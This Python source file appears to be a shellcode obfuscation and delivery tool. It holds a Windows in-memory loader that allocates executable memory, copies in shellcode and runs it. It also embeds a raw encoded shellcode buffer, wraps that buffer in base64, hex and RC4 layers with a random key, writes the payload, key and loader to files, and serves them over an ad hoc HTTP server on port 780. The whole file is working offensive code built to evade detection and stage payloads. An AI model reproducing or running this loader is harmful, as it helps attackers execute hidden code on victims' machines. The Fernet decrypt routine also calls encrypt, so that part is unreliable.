# -*- coding: UTF-8 -*-
import string
import base64
import random
from os import system
from cryptography.fernet import Fernet
from sys import version_info


LOADER = """
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(buf), len(buf))
runcode = ctypes.cast(rwxpage, ctypes.CFUNCTYPE(ctypes.c_void_p))
runcode()
"""


class Rc4:
    def __init__(self):
        pass
    
    def init_box(self, key):
        s_box = list(range(256))
        j = 0
        for i in range(256):
            j = (j + s_box[i] + ord(key[i % len(key)])) % 256
            s_box[i], s_box[j] = s_box[j], s_box[i]
        return s_box

    def encrypt(self, message, key):
        ciphertext = self.run(message, key)
        if version_info >= (3,0):
            base64_cipher = str(base64.b64encode(ciphertext.encode('utf-8')), 'utf-8')  # python3
        else:
            base64_cipher = base64.b64encode(ciphertext)
        return base64_cipher

    def decrypt(self, message, key):
        if version_info >= (3,0):
            ciphertext = str(base64.b64decode(message.encode('utf-8')), 'utf-8') # python3
        else:
            ciphertext = base64.b64decode(message)
        plaintext = self.run(ciphertext, key)
        return plaintext

    def run(self, message, key):
        box = self.init_box(key)
        res = []
        i = j = 0
        for s in message:
            i = (i + 1) % 256
            j = (j + box[i]) % 256
            box[i], box[j] = box[j], box[i]
            t = (box[i] + box[j]) % 256
            k = box[t]
            res.append(chr(ord(s) ^ k))
        cipher = "".join(res)
        return cipher


class Xor:
    def __init__(self):
        pass

    def decrypt(self, message, xor_key):
        random.seed(xor_key)
        ciphertext = ''
        code = message.split('.')
        for i in code:
            ciphertext = ciphertext + chr(int(i) ^ random.randint(0, 255))
        return ciphertext

    def encrypt(self, message, xor_key):
        random.seed(xor_key)
        ciphertext = ''
        for i in message:
            ciphertext = ciphertext + str(ord(i) ^ random.randint(0, 255)) + "."
        return ciphertext.rstrip('.')


class Encoder:
    def __init__(self):
        pass

    def _base16(self, message):
        return base64.b16encode(message)

    def _base64(self, message):
        return base64.b64encode(message)

    def _base32(self, message):
        return base64.b32encode(message)

    def _hex(self, message):
        if version_info >= (3,0):
            return message.hex()
        else:
            return message.encode('hex')


class Encrypt:
    def __init__(self):
        pass

    def rc4_encrypt(self, message, rc4_key):
        return Rc4().encrypt(message, rc4_key)

    def xor_encrypt(self, message, xor_key):
        return Xor().encrypt(message, xor_key)

    def fernet_encrypt(self, message, fernet_key):
        return Fernet(fernet_key).encrypt(message)


class Decoder:
    def __init__(self):
        pass

    def _base64(self, message):
        return base64.b64decode(message)

    def _base32(self, message):
        return base64.b32decode(message)

    def _base16(self, message):
        return base64.b16decode(message)

    def _hex(self, message):
        if version_info >= (3,0):
            return bytes.fromhex(message)
        else:
            return message.decode('hex')


class Decrypt:
    def __init__(self):
        pass

    def rc4_decrypt(self, message, rc4_key):
        return Rc4().decrypt(message, rc4_key)    

    def xor_decrypt(self, message, xor_key):
        return Xor().decrypt(message, xor_key)

    def fernet_decrypt(self, message, fernet_key):
        return Fernet(fernet_key).encrypt(message)


class GetKey:
    def __init__(self):
        pass

    def random_key(self, length):
        numOfNum = random.randint(1, length-1)
        numOfLetter = length - numOfNum
        slcNum = [random.choice(string.digits) for i in range(numOfNum)]
        slcLetter = [random.choice(string.ascii_letters) for i in range(numOfLetter)]
        slcChar = slcNum + slcLetter
        random.shuffle(slcChar)
        getPwd = ''.join([i for i in slcChar])
        return getPwd
    
    def fernet_key(self, length):
        return Fernet.generate_key()


if __name__ == "__main__":
    buf =  b""
    buf += b"\xda\xc1\xbd\x0d\x85\x5e\x61\xd9\x74\x24\xf4\x58"
    buf += b"\x31\xc9\xb1\xb8\x31\x68\x17\x83\xc0\x04\x03\x65"
    buf += b"\x96\xbc\x94\xcb\xc7\xa4\xcc\xc3\x22\xfb\x2a\x57"
    buf += b"\xf7\xf0\x95\xa6\x3e\x49\x94\xf9\xb0\xb9\xd4\x89"
    buf += b"\x23\x3d\x1a\x32\x42\x2f\xb6\x62\x55\x4a\x22\xb6"
    buf += b"\x77\x6b\x79\xab\xbe\xcc\x78\xf7\xc9\x07\xed\x4e"
    buf += b"\x54\xe1\x0b\xec\x86\x3b\x2e\x49\x70\x20\x0b\xc1"
    buf += b"\x06\xdd\xeb\x52\xe2\x92\xc2\xba\x09\xcd\x65\xfe"
    buf += b"\x34\x87\xb3\x30\xa4\x75\x60\x6b\xb2\xd1\xa5\xf3"
    buf += b"\xb1\xa2\x0b\x6a\x81\xee\x3a\x3c\x87\x1e\x36\x95"
    buf += b"\x2a\x0b\x6c\x3c\x09\x49\x04\xc1\xfc\x50\x74\x64"
    buf += b"\xe9\x47\x18\x06\x06\xa7\x01\x25\x68\xb7\xf8\x31"
    buf += b"\x2e\x8a\x4e\x6d\x06\x1c\x23\xe6\x2d\x6f\xc9\xe9"
    buf += b"\x29\xf2\x06\xc0\x8d\xf5\x94\x5f\x7c\xff\x4a\xf8"
    buf += b"\x83\x08\x5a\xdb\x1c\xff\x46\x2f\xb6\xf2\xda\x54"
    buf += b"\x1f\x8d\xa5\x7b\x21\x62\xb7\xcd\x3f\xcc\xb9\x2d"
    buf += b"\x43\xa2\xe2\xdd\x39\xdc\x17\x60\xb2\x0b\xf9\x0c"
    buf += b"\x43\x6a\x47\x21\x57\x89\x31\xf2\x0b\x1a\xc5\xe8"
    buf += b"\x18\x1f\xde\xc3\xea\x2f\xf1\x02\xd5\x6d\xfb\x0c"
    buf += b"\x70\x84\x17\x32\xe3\xbf\x31\x57\xf5\x69\x3e\x0e"
    buf += b"\x59\xd6\x17\xec\xbb\xad\xc0\x38\x90\xa7\xa9\xaa"
    buf += b"\xa5\xd2\x25\xc2\x69\xa0\x85\xb5\x7d\x8c\x87\xcb"
    buf += b"\xb4\xc7\x55\xa7\xa4\xea\x93\xbc\xee\xad\x85\xb7"
    buf += b"\x0f\x33\x43\x76\xb2\xdf\xc9\x7c\x5a\xab\xc0\x7e"
    buf += b"\x16\xcb\xd3\xac\x15\xd1\x46\x0c\xa8\x48\x37\xa6"
    buf += b"\xa6\x0b\x68\x97\x2d\xc2\xd9\xad\x37\xff\x81\xf3"
    buf += b"\x2b\xa8\x68\x5e\x75\x7d\xa6\x5e\xba\xa8\x57\x44"
    buf += b"\x54\x06\x42\xa1\x5e\x2e\x47\x7d\x30\xc6\xc0\x97"
    buf += b"\xb5\x87\x3e\x4c\xb3\x11\xfe\xdd\x97\xc1\x2c\x0f"
    buf += b"\xec\x90\x90\x36\x4f\xb5\x71\x40\x33\xb7\x9a\x70"
    buf += b"\x33\xfe\xa7\x88\xc5\x3e\xa1\xc8\x07\x18\x36\xeb"
    buf += b"\xd5\x48\x22\x1f\xd8\x05\x5e\x9e\x1c\x53\x05\x84"
    buf += b"\x75\x19\xcd\x11\xce\xc1\xb7\x48\x16\x08\x8a\x51"
    buf += b"\x24\xff\x3c\x93\x9a\x4b\x62\x04\x5c\x7e\xec\x35"
    buf += b"\xa3\xe6\x01\xb6\x87\xa4\xeb\x0b\xc3\xce\x2a\x22"
    buf += b"\xdf\xe6\xdc\x54\xfd\x2f\x08\x3c\xd4\x20\x8a\xc2"
    buf += b"\x86\xe8\xf0\x2b\xef\x1b\x1f\xb5\xe6\xf2\x95\x1f"
    buf += b"\x7d\x2a\xc6\x63\xd1\x11\x27\x95\x7f\x4d\x6c\x29"
    buf += b"\xbd\xa4\x06\xac\x37\x70\x29\x80\x7e\x3d\x64\x5e"
    buf += b"\xb6\xe1\xa5\x03\x1e\xf6\x34\xfd\x62\x43\x67\xb1"
    buf += b"\x9d\x81\x49\x9d\x73\xd0\x9e\x97\x8b\x79\x8d\xc3"
    buf += b"\xab\x68\x10\x43\xb2\xb2\x5a\xe9\x3d\xbd\xc7\x74"
    buf += b"\x16\xd6\x35\x50\x87\xb3\xa7\x26\x22\xe9\x43\x25"
    buf += b"\xd2\x3d\xa7\x8a\xbb\x1b\x95\x29\x56\x79\x35\xdf"
    buf += b"\x95\xb8\x20\xbb\x50\x9d\xa5\xeb\x6f\xd0\xb4\xe2"
    buf += b"\x19\x91\x20\xec\x1c\x15\xce\xdc\x88\xaa\x47\x29"
    buf += b"\xdb\x1c\xea\x3a\x18\xd2\xe2\xf7\xa4\x1b\x80\x37"
    buf += b"\x1f\xb0\x05\x1a\xcd\xf7\xe4\x63\x92\x47\x86\xf3"
    buf += b"\x65\x55\xd6\xd7\xca\x58\x89\x10\x8c\xf6\x9a\xb0"
    buf += b"\xba\x36\xaa\x16\xfc\x3f\x48\x2d\xd2\x4c\x70\xbd"
    buf += b"\x26\xe2\x2c\xbf\x64\xe1\x37\x0b\xab\xcb\x33\x74"
    buf += b"\x1b\x20\x7b\x88\x94\x84\xbb\xd0\xb4\x48\x4b\xe0"
    buf += b"\xbc\xc7\x79\x56\x09\x76\x89\xd8\x9d\x32\x08\x0e"
    buf += b"\xfb\xb2\xd1\xc0\xf3\x25\x25\x5c\x38\x0f\x0b\xda"
    buf += b"\xd6\xe2\x1d\x7b\x35\x89\xc5\xfd\x84\xb3\xf2\x04"
    buf += b"\x58\x73\xa3\xfc\xaa\x70\x08\x97\x0e\xa0\x04\xa5"
    buf += b"\x2e\xb1\x0c\xde\x58\x5f\xc8\x97\x8f\x4c\x62\xf8"
    buf += b"\x48\x60\x81\xab\xe5\x9b\x13\x62\x57\xff\x8e\x25"
    buf += b"\x7c\xe0\x5a\x79\x06\x98\xbb\x78\x07\x7a\x66\xb2"
    buf += b"\x6c\x6f\x0f\x3a\xf7\x6b\xe6\xc5\xe4\x10\x57\xfb"
    buf += b"\xa6\x8a\x9a\xdd\x87\x2d\x5c\x87\x37\xad\x68\xda"
    buf += b"\x08\xc5\x0a\xeb\xcb\x01\xe4\x48\xf8\xc8\x5d\x17"
    buf += b"\x3a\x75\x21\xd4\xde\x4a\xef\xcd\x3d\xa8\x41\x9b"
    buf += b"\xaf\x55\x2d"
    # base64 + hex + rc4
    key = GetKey().random_key(10)
    buf = Encoder()._base64(buf)
    buf = Encoder()._hex(buf)
    buf = Encrypt().rc4_encrypt(buf, key)
    base64_loader = Encoder()._base64(LOADER.encode('utf-8')).decode("utf-8")
    print("key: " + key + "\n")
    print("shellcode: " + buf + "\n")
    print("loader: " + base64_loader + "\n")
    # read-in data
    with open('code.txt', mode='w') as f1:
        f1.write(buf)
    with open('key.txt', mode='w') as f2:
        f2.write(key)
    with open('loader.txt', mode='w') as f3:
        f3.write(base64_loader)
    if version_info >= (3,0):
        system("python3 -m http.server 780")
    else:
        system("python2 -m SimpleHTTPServer 780")
    
